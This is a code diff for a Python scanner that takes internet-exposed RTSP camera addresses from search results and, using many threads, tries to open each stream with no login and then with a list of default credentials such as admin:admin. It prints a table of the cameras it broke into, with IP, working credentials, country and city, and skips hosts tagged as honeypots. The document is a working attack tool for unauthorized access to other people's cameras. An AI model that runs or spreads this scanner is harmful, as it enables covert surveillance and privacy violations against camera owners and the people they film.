@@ -7,6 +7,8 @@ from time import sleep
 from queue import Queue
 from prettytable import PrettyTable
 
+def clear():
+    os.system('clear') if not sys.platform == "win32" else print('\n' * 100)
     
 banner = '''
 ┌───────────────────────────────────────────────────────────────────────┐
@@ -23,6 +25,7 @@ banner = '''
 Find Vulnerable RTSP Cameras Around the World
 '''
 
+clear()
 print(banner)
 
 
@@ -78,29 +81,68 @@ print(x)
 
 info('Starting RTSP Probing in 5 Seconds...\n')
 sleep(5)
+clear()
 defaultcredentials = ['admin', 'root', 'admin:admin', 'admin:password', 'root:root', 'root:admin', 'admin:root']
 badcams = []
 allcams = []
 print_lock = threading.Lock()
 
-def tryrtsp(ip, creds):
-    cap = cv2.VideoCapture(f'rtsp://{creds}@{ip}')
-    ret, frame = cap.read()
-    if ret == True:
-        return creds
-    return False
+def tryrtsp(ip):
+	cap = cv2.VideoCapture(f'rtsp://{ip}')
+	ret, frame = cap.read()
+	if ret == True:
+		return 'None'
+	else:
+		for i in defaultcredentials:
+			cap = cv2.VideoCapture(f'rtsp://{i}@{ip}')
+			ret, frame = cap.read()
+			if ret == True:
+				return i
+			else:
+				pass
+	return False
 
 def rtspprobe(target):
-    info(f'Probing {target["ip_str"]}...')
-    if "honeypot" in str(target):
-        rtspresult = False
-    else:
-        for creds in defaultcredentials:
-            rtspresult = tryrtsp(target['ip_str'], creds)
-            if rtspresult != False:
-                badcams.append({"ip":target["ip_str"], "country":target["location"].get("country_name", ""), "city":target["location"].get("city", ""), "pass":str(creds)})
-                break
-        else:
-            rtspresult = False
-    if rtspresult == False:
-        allcams.append({"ip":target["ip_str"], "country":target["location"].get("country_name", ""), "city":target["location"].get("city", "")})
+	info(f'Probing {target["ip_str"]}...')
+	if "honeypot" in str(target):
+		rtspresult = False
+	else:
+		rtspresult = tryrtsp(target['ip_str'])
+	if rtspresult != False:
+		badcams.append({"ip":target["ip_str"], "country":target["location"]["country_name"], "city":target["location"]["city"], "pass":str(rtspresult)})
+	else:
+		pass
+	allcams.append({"ip":target["ip_str"], "country":target["location"]["country_name"], "city":target["location"]["city"], "pass":str(rtspresult)})
+	clear()
+	print(banner)
+	info('Probing RTSP Cameras... be patient!')
+	if len(badcams) < 1:
+		pass
+	else:
+		for c in badcams:
+			success(f'Vulnerable RTSP Camera: {c["ip"]}, {c["pass"]}')
+	print(f'\nProbed {reverse}' + str(len(allcams)) + '/' + str(len(results['matches'])) + f'{fullreset} Cameras')
+def threader():
+
+	while True:
+		worker = q.get()
+		rtspprobe(worker)
+		q.task_done()
+q = Queue()
+for a in range(args.t):
+	t = threading.Thread(target=threader)
+	t.daemon = True
+	t.start()
+for worker in results['matches']:
+	q.put(worker)
+q.join()
+		
+print('\n\n')
+x = PrettyTable()	
+x.field_names = ["IP", "Authentication", "Country", "City"]
+for badcam in badcams:
+	x.add_row([badcam["ip"], badcam["pass"], badcam["country"], badcam["city"]])
+clear()
+print(banner)
+info('Final Results:')
+print(x)
